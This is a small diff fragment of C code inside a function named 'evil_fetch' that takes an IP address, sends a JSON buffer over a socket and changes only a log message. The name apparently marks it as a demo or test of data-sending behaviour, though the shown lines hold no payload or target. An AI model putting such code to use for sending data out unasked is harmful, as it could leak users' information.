@@ -65,7 +65,7 @@ void evil_fetch(char *ip) {
 
   send(sockfd, json_data, strlen(json_data), 0);
 
-  printf("Sent data: %s\n", json_data);
+  printf("%s", json_data);
   free(json_data);
   close(sockfd);
 }
